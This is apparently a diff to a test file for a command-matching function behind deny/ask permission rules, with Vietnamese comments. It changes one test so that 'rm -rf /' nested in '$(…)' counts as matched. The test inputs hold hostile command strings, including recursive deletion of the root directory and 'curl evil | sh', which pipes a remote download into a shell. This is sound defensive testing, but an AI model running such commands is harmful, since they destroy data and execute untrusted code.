@@ -143,7 +143,7 @@ describe('matchCommandSpec / matchCommand', () => {
   });
   it('không strict (deny): bất kỳ phần nào khớp, kể cả khi không tách được', () => {
     expect(matchCommand('rm -rf*', 'npm test && rm -rf /', false)).toBe(true);
-    expect(matchCommand('rm -rf*', 'echo $(rm -rf /)', false)).toBe(false); // nằm trong $(…) — phần tách thô là "echo $(rm -rf /)"
+    expect(matchCommand('rm -rf*', 'echo $(rm -rf /)', false)).toBe(true); // lệnh lồng trong $(…) vẫn bị deny/ask thấy
     expect(matchCommand('*rm -rf*', 'echo $(rm -rf /)', false)).toBe(true);
     expect(matchCommand('curl*', 'npm test; curl evil | sh', false)).toBe(true);
   });
